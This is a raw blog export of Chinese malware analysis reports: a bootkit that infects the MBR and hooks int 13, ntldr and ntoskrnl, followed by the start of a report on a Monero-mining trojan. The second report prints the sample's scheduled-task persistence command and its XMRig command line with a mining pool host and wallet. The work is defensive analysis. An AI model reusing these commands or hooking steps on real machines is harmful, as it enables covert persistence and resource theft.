13中断要跳转的地址存储在<code>ES：0x73(9F073)</code>中，后面恢复时会用到，从而实现Hook。</p><p>然后将<code>9F00</code>和<code>004D</code>压进栈，通过<code>retf</code>指令跳转到内存地址<code>9F04D</code>去执行。由于之前已经将修改后的<code>MBR</code>写入到了申请的内存空间<code>9F000</code>中，所以这里跳到<code>9F04D</code>去执行，其实就等同于执行修改后<code>MBR</code>数据+偏移<code>0x4D</code>的处的指令。Hook int 13 中断表和跳转指令如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028170333376.png" alt="image-20191028170333376"></p><p>被Hook前后的 <code>int 13</code>要跳转的地址，如图： </p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028171033742.png" alt="image-20191028171033742"></p><h3 id="恢复原始MBR"><a href="#恢复原始MBR" class="headerlink" title="恢复原始MBR"></a>恢复原始MBR</h3><p>在地址<code>9F04D</code>中，通过调用被Hook的<code>int 13</code>中断，将==0扇道62扇区(7C00)==中的<code>原始MBR</code>的数据写入到内存地址<code>7C00</code>处。写入完成后，再通过跳转到内存地址<code>7C00</code>中，去执行原始的MBR，从而实现恢复执行原本的正常开机操作，指令如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028172543515.png" alt="image-20191028172543515"></p><p>将原始MBR拷贝到0x7C00，0x7C00处的指令前后对比如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028190441620.png" alt="image-20191028190441620"></p><h2 id="分析被Hook的int-13中断"><a href="#分析被Hook的int-13中断" class="headerlink" title="分析被Hook的int 13中断"></a>分析被Hook的int 13中断</h2><p>由于上一步恢复原始MBR时，会调用被Hook的<code>int 13</code>中断来实现。当调用被Hook的<code>int 13</code>中断时，会使其跳转到申请的内存地址<code>9FC66</code>中去执行。接下来将主要分析要执行的Hook函数。</p><p><strong>Hook int 13的hook函数进行的操作有：</strong></p><ul><li>根据判断调用int 13中断的不同方式，恢复原本int 13要执行的操作。</li><li>遍历匹配<code>ntldr</code>寻找特征序列码：==8B F0 85 F6 74 21 80 3D==</li><li>Hook 找到的特征码指令，将其指令修改为<code>call 9F1FC</code>，但实际call的地址是<code>9F200</code>，也就是执行之前拷贝到内存空间的==第60扇区中的数据==，这样就又回到了病毒代码。</li></ul><h3 id="恢复原本int-13要执行的操作"><a href="#恢复原本int-13要执行的操作" class="headerlink" title="恢复原本int 13要执行的操作"></a>恢复原本int 13要执行的操作</h3><p>在之前Hook int 13中断时，将原本int 13要跳转的地址存在了CS:0x73的偏移处（可看之前hook int 13有分析），</p><p>然后首先通过对比ah的值来判断调用int 13的方式，分为扩展int 13调用读方式和非扩展int 13调用读方式，当不是这两种时，便会跳转到原本int 13应该跳转的地址<code>ECBE2</code>，执行原本的int 13应该执行的操作；若是这两种调用方式，便跳转到<code>9F077</code>去执行，然而在9F07E处，又重新call 了原本int 13的地址，代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028181744048.png" alt="image-20191028181744048"></p><h3 id="遍历匹配特征序列码"><a href="#遍历匹配特征序列码" class="headerlink" title="遍历匹配特征序列码"></a>遍历匹配特征序列码</h3><p>通过汇编指令<code>repne scasb</code>来遍历<code>ntldr</code>匹配特征序列：8B F0 85 F6 74 21 80 3D，来寻找要Hook的地方，指令如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028192647478.png" alt="image-20191028192647478"></p><p>匹配到的特征序列（要被Hook的指令）对应的反汇编，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028194904794.png" alt="image-20191028194904794"></p><h3 id="Hook-匹配到的特征码的指令"><a href="#Hook-匹配到的特征码的指令" class="headerlink" title="Hook 匹配到的特征码的指令"></a>Hook 匹配到的特征码的指令</h3><p>Hook 找到的特征码指令，将其指令<code>mov si,ax</code>修改为<code>call 9F1FC</code>，当执行这条指令时，便会跳转到地址<code>9F200</code>中去执行，也就是执行之前拷贝到内存空间的==第60扇区中的数据==，这样就又回到了病毒的代码区域。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028194835292.png" alt="image-20191028194835292"></p><p>Hook前后的指令，对比如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028195313983.png" alt="image-20191028195313983"></p><h2 id="分析被Hook的ntldr"><a href="#分析被Hook的ntldr" class="headerlink" title="分析被Hook的ntldr"></a>分析被Hook的ntldr</h2><p>通过上一步通过匹配特征Hook了ntldr中的地址<code>46C3C</code>中的指令，当执行到地址<code>46C3C</code>时，便会执行指令<code>call off_9F1FC（实际call到内存地址0x9F200上去执行）</code>，重新回到之前拷贝到申请的内存中的60扇区中的指令去执行，接下来将详细分析拷贝到申请内存中的60扇区中的指令。</p><p><strong>写入60扇区中的指令主要操作有：</strong></p><ul><li>通过遍历匹配特征，定位到 <code>BlLoaderBlock</code> 结构，再根据层层结果遍历得到<code>ntoskrnl.exe</code>的模块基址。</li><li>遍历模块<code>ntoskrnl.exe</code>，匹配特征6A 4B 6A 19 E8 和 E8 xx xx xx xx xx 84 C0，找到要Hook的地址，也就是找到函数<code>IoInitSystem</code>。</li><li>将61扇区中大小为512字节的指令，拷贝至该<code>ntoskrnl.exe</code>模块的最后512字节的位置中，并记下拷贝后的起始地址。</li><li>Hook之前匹配的执行函数<code>IoInitSystem</code>处的地址，将其指令修改为跳转到拷贝后的起始位置去执行。</li></ul><h3 id="获取ntoskrnl-exe模块基址"><a href="#获取ntoskrnl-exe模块基址" class="headerlink" title="获取ntoskrnl.exe模块基址"></a>获取ntoskrnl.exe模块基址</h3><p>通过遍历匹配特征 ==C7 46 34 00 40==，定位到 <code>BlLoaderBlock</code> 结构，再根据BlLoaderBlock-&gt;LoadOrderListHead-&gt;nt!_LDR_DATA_TABLE_ENTRY-&gt;ntoskrnl.exe，遍历得到<code>ntoskrnl.exe</code>的模块基址，指令如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028202135933.png" alt="image-20191028202135933"></p><h3 id="匹配特征找到要Hook的地址"><a href="#匹配特征找到要Hook的地址" class="headerlink" title="匹配特征找到要Hook的地址"></a>匹配特征找到要Hook的地址</h3><p> 遍历获取到的<code>ntoskrnl.exe</code>的模块，先根据特征值==6A 4B 6A 19 E8==再根据==E8 xx xx xx xx xx 84 C0==匹配到要Hook的地址<code>0x8069A3CF</code>（执行函数<code>IoInitSystem</code>的地址），并将执行函数<code>IoInitSystem</code>的地址保存至0x9F400（61扇区）+0x4的偏移处，用来恢复被Hook的<code>IoInitSystem</code>指令，然后将要Hook的地址压进栈中保存。指令如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191030195826804.png" alt="image-20191030195826804"></p><p>匹配到特征的地址处的指令（Hook前的原始指令），如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191030195236994.png" alt="image-20191030195236994"></p><h3 id="拷贝61扇区中的数据至文件末尾"><a href="#拷贝61扇区中的数据至文件末尾" class="headerlink" title="拷贝61扇区中的数据至文件末尾"></a>拷贝61扇区中的数据至文件末尾</h3><p>遍历文件<code>ntoskrnl.exe</code>，找到该文件末尾512字节地址处，并将样本写入61扇区中的数据拷贝到该位置处，并记录下拷贝后的起始地址。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191030195645876.png" alt="image-20191030195645876"></p><p>文件末尾512字节(0x806E5E00)拷贝前后对比图:</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191031192527569.png" alt="image-20191031192527569"></p><h3 id="Hook-匹配到特征的地址"><a href="#Hook-匹配到特征的地址" class="headerlink" title="Hook 匹配到特征的地址"></a>Hook 匹配到特征的地址</h3><p>首先将之前通过匹配特征码找到的函数<code>IoInitSystem</code>执行的地址，从栈中取出来，然后将执行函数<code>IoInitSystem</code>的指令修改为执行拷贝61扇区到最后512字节的地址0x806E5E00处，此时hook后就会call到拷贝61扇区数据后的地址处去执行，就能执行回样本写入的指令处，实现Hook。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191031192929062.png" alt="image-20191031192929062">Hook前后的指令对比图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191031193523206.png" alt="image-20191031193523206"></p><h2 id="分析被Hook的ntoskrnl"><a href="#分析被Hook的ntoskrnl" class="headerlink" title="分析被Hook的ntoskrnl"></a>分析被Hook的ntoskrnl</h2><p>当操作系统启动时，便会执行<code>ntoskrnl</code>中被Hook的函数，便会跳转到文件末尾的病毒代码空间中去执行。也就是病毒写入61扇区中的指令，其主要功能是实现加载并运行之前写入的驱动程序。</p><p>写入<code>ntoskrnl</code>中的病毒代码（61扇区）主要实现了：</p><ul><li>调用函数<code>ExAllocatePool</code>，开辟内存空间，然后将（61扇区中）剩下的未执行的指令拷贝至开辟的内存空间中，并跳转到内存空间中执行。</li><li>执行之前被Hook 的函数IoInitSystem，初始化操作系统。</li><li>将恶意样本之前写入的驱动文件加载至内存中，将其展开并运行该驱动程序。</li></ul><h3 id="开辟内存空间拷贝数据并执行"><a href="#开辟内存空间拷贝数据并执行" class="headerlink" title="开辟内存空间拷贝数据并执行"></a>开辟内存空间拷贝数据并执行</h3><p>首先根据hash值3707E062h，调用函数<code>SearchKernelFunctionAddress</code>，来获取函数<code>ExAllocatePool</code>的地址。然后再执行函数<code>ExAllocatePool</code>开辟大小为1ABh的内存空间，将（61扇区拷贝至ntoskrnl中的指令）剩下还未执行的指令拷贝到虚拟内存空间中执行。代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191103160909136.png" alt="image-20191103160909136"></p><h3 id="执行之前被Hook的函数IoInitSystem"><a href="#执行之前被Hook的函数IoInitSystem" class="headerlink" title="执行之前被Hook的函数IoInitSystem"></a>执行之前被Hook的函数IoInitSystem</h3><p>通过将之前压进栈的函数IoInitSystem的地址取出，然后Call去调用之前被Hook的函数<code>IoInitSystem</code>，来初始化操作系统。指令如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191103161919014.png" alt="image-20191103161919014"></p><p>###　加载恶意驱动文件并执行</p><p>首先获取一些内核函数，如ntOpenFile，ntReadFile，ntClose，ExAllocatepool。然后再将之前样本写入磁盘的驱动程序加载到内存中，将其展开并跳转到OEP处去运行，指令如下图：</p><p><strong>读取到样本写入的驱动文件：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191103174921598.png" alt="image-20191103174921598"></p><p><strong>将其再内存中展开：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191103175101629.png" alt="image-20191103175101629"></p><p><strong>跳转到驱动程序的OEP处执行：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191103175319220.png" alt="image-20191103175319220"></p><h2 id="恶意驱动程序有待进一步分析"><a href="#恶意驱动程序有待进一步分析" class="headerlink" title="恶意驱动程序有待进一步分析"></a>恶意驱动程序有待进一步分析</h2><p>由于驱动相关方面的知识还很匮乏，这里就先不继续进行分析了。以后有相关知识的累积再进一步进行分析。</p><h1 id="样本溯源"><a href="#样本溯源" class="headerlink" title="样本溯源"></a>样本溯源</h1><p>经过分析可知，该样本属于Bootkit类型病毒， Bootkit是更高级的Rootkit。经过查找相关指令应该是早些年爆发的==鬼影病毒==，利用感染MBR，加载恶意驱动程序来实施攻击。</p><p><strong>相关文件信息</strong></p><table><thead><tr><th>FileName</th><th>FileSize</th><th>MD5</th></tr></thead><tbody><tr><td>1.exe11.vir</td><td>236 KB (242,176 字节)</td><td>8CFA512BA62399F135C03505A93533F3</td></tr><tr><td>1.exe11.dll</td><td>236 KB (242,176 字节)</td><td>8CFA512BA62399F135C03505A93533F3</td></tr><tr><td>恶意驱动文件</td><td>239 KB (244,736 字节)</td><td>D00123F9C4C3226B8800A623C9999D70</td></tr><tr><td>00000218.tmp</td><td>根据系统环境不定</td><td>根据系统环境不定</td></tr></tbody></table><h1 id="查杀方案"><a href="#查杀方案" class="headerlink" title="查杀方案"></a>查杀方案</h1><h2 id="恢复原始MBR-1"><a href="#恢复原始MBR-1" class="headerlink" title="恢复原始MBR"></a>恢复原始MBR</h2><p>由于该样本修改了原始的MBR，执行修改后的MBR来实施攻击，只需要将原始的MBR还原就可以阻止该攻击了，具体操作为：</p><ul><li>删除修改后的MBR中的数据，将存储在62扇区中的原本的MBR数据还原回MBR中，就可以达到恢复的效果了。</li></ul><h2 id="删除注册的服务"><a href="#删除注册的服务" class="headerlink" title="删除注册的服务"></a>删除注册的服务</h2><p>由于该样本将自身修改为一个dll文件，并注册为了系统服务。在恢复时还需要将该服务进行删除，执行如下指令即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 &#x2F;u  &quot;&lt;SamplePath&gt;.dll&quot;</span><br></pre></td></tr></table></figure><h2 id="删除恶意写入的数据"><a href="#删除恶意写入的数据" class="headerlink" title="删除恶意写入的数据"></a>删除恶意写入的数据</h2><p>恢复过MBR后，还需要将恶意样本写入到操作系统中的数据删除，具体操作为：</p><ul><li>删除60,61,62扇区中的数据</li><li>删除写入磁盘中的驱动文件</li><li>删除释放在样本当前目录下的dll文件</li><li>删除释放在临时目录下的00000218.tmp文件</li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote><p>该恶意样本通过感染MBR实现早于系统执行自己的恶意代码来将写入磁盘中的驱动文件加载起来运行。整个样本以非文件形式存在，直接写入磁盘扇区。并且是对MBR进行的感染，在很大程度上能隐蔽自身，并在一定程度上逃避杀软的检测。因此建议在平时使用计算机时，不要随意下载不正常文件，不接受不明来源的文件，以避免感染病毒。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 样本分析报告 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 奇兵计划 </tag>
            
            <tag> 样本分析报告 </tag>
            
            <tag> BootKit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>挖矿木马分析报告</title>
      <link href="2019/10/20/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/"/>
      <url>2019/10/20/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<center><font size = 8><b>挖矿木马分析报告</b></font></center><h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><table><thead><tr><th align="center">样本名称</th><th align="center">d48ab2e921f5c725672fce16135d1f09.vir</th></tr></thead><tbody><tr><td align="center"><strong>样本类型</strong></td><td align="center"><strong>挖矿木马</strong></td></tr><tr><td align="center"><strong>样本大小</strong></td><td align="center"><strong>457 KB (468,480 字节)</strong></td></tr><tr><td align="center"><strong>MD5</strong></td><td align="center"><strong>d48ab2e921f5c725672fce16135d1f09</strong></td></tr></tbody></table><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote><p>该挖矿木马感染受害主机后，会将自身复制到<code>%AppData%目录</code>下，并以svchostx64.exe来命名，从而伪装自身。然后通过创建计划任务来维持该样本运行。样本文件的<code>.plato节表</code>中包含了一个开源的矿机<code>XMRig.exe</code>，该恶意样本再执行时通过创建自身傀儡进程，将开源矿机<code>XMRig.exe</code>注入其中，从而实现利用受害主机资源来进行挖矿。该样本不仅会判断受害主机当前是否处于空闲，还会监控进程。当不空闲时（也就是用户正在执行操作时）或是监控到任务管理器进程时，便结束傀儡进程，终止挖矿，来隐藏自身不被发现。</p></blockquote><h1 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h1><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC.png" alt="07_挖矿木马"></p><h1 id="简单行为分析"><a href="#简单行为分析" class="headerlink" title="简单行为分析"></a>简单行为分析</h1><h2 id="复制自身"><a href="#复制自身" class="headerlink" title="复制自身"></a>复制自身</h2><p>运行样本后，复制自身文件到指定目录<code>C:\Users\&lt;UserName&gt;\AppData\Roaming\</code>下，并重命名为<code>svchostx64.exe</code>。如图1：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570759489414.png" alt="1570759489414"></p><center>图1</center><h2 id="创建计划任务"><a href="#创建计划任务" class="headerlink" title="创建计划任务"></a>创建计划任务</h2><p>该样本通过调用<code>schtasks.exe</code>,执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;C:\Windows\System32\schtasks.exe&quot; &#x2F;SC MINUTE &#x2F;MO 1 &#x2F;F &#x2F;Create &#x2F;TN Adasdsadas3id &#x2F;tr &quot;\&quot;C:\Users\john\AppData\Roaming\svchostx64.exe\&quot;&quot;</span><br></pre></td></tr></table></figure><p>创建名为==Adasdsadas3id==的计划任务，每一分钟运行一次释放出来的<code>svchostx64.exe</code>，如图2：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570759700585.png" alt="1570759700585"></p><center>图2</center><p>每一分钟运行一次计划任务，并迅速结束了自身程序，如图3：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570760693484.png" alt="1570760693484"></p><center>图3</center><h2 id="进行网络连接"><a href="#进行网络连接" class="headerlink" title="进行网络连接"></a>进行网络连接</h2><p>可以从上图中看出，再创建完计划任务后，再次==运行自身程序==，并执行了如下参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-o monerohash.com:3333 -u 4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQni58KYZqH43YSDeqY -p x -k --donate-level&#x3D;1 -t 3</span><br></pre></td></tr></table></figure><p>其中含有可疑URL：<code> monerohash.com:3333</code>，如图4：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570760329353.png" alt="1570760329353"></p><center>图4</center><p>并与IP：<code>107.191.99.95：3333</code>和<code>107.191.99.221:3333</code>，进行TCP链接，如图5：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570760539014.png" alt="1570760539014"></p><center>图5</center><h1 id="样本详细分析"><a href="#样本详细分析" class="headerlink" title="样本详细分析"></a>样本详细分析</h1><h2 id="获取dump-exe"><a href="#获取dump-exe" class="headerlink" title="获取dump.exe"></a>获取dump.exe</h2><p>首先通过工具查壳，显示该恶意样本没有壳，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570865891662.png" alt="1570865891662"></p><p><strong>异常区段</strong></p><p>然后查看样本的节表，发现其中<code>.data</code>区段很可疑。其中<code>.data</code>区段的<code>virtualsize</code>远远大于<code>Raw Size</code>，基本可以推测该样本是一个经过特殊处理的，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570873032573.png" alt="1570873032573"></p><p><strong>混淆代码</strong></p><p>然后将样本拖入IDA中，发现其中有大量窗体程序的<code>API</code>，而样本的执行行为中并没有发现有关窗体的行为。</p><p>经过分析，这些窗体程序的<code>API</code>全部都==存在问题==，都无法正常执行，（推断这些<code>API</code>是用来==迷惑分析==的）。但在这些==迷惑分析==的<code>API</code>中，夹杂着真正执行的程序代码。如下图，红色框标识的便是真正执行的程序代码。除红色框标识外的指令，大多都是垃圾指令，都无法正常执行。</p><p>==真正执行的程序代码：==</p><ul><li>调用函数<code>LocalAlloc</code>，开辟大小为<code>0X4FCF3</code>的堆空间</li><li>将地址<code>0x40D1C+0x7958C</code>中的==经过加密==的汇编指令，写入开辟的堆空间中</li><li>执行函数<code>Decode_409320</code>，==解密==堆空间中的汇编指令</li><li>执行开辟的堆空间中的汇编指令</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570871646828.png" alt="1570871646828"></p><p><strong>获取dump.exe</strong></p><p>由于在执行堆空间中的指令之前都没有执行任何功能代码，便==推测==在堆空间中，很可能会开辟虚拟空间来存储==PE文件==，然后将其展开再执行。</p><p>这里用<code>OD</code>跟到开辟的堆空间中，给函数<code>VirtualAlloc</code>下断点，然后F9运行，发现果不其然命中断点，然后再在开辟的虚拟空间中下==硬件写入断点==，果真写入了一个PE文件，==应征了推测==。这里便可将其dump下来，并起名为<code>dump.exe</code>，该文件便是真正要执行的程序。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570873528537.png" alt="1570873528537"></p><p>然后继续用<code>OD</code>跟，便会发现在虚拟空间中，将这个==PE文件进行展开==，然后最终跳回该PE文件的<code>OEP</code>处执行。</p><h2 id="分析dump-exe"><a href="#分析dump-exe" class="headerlink" 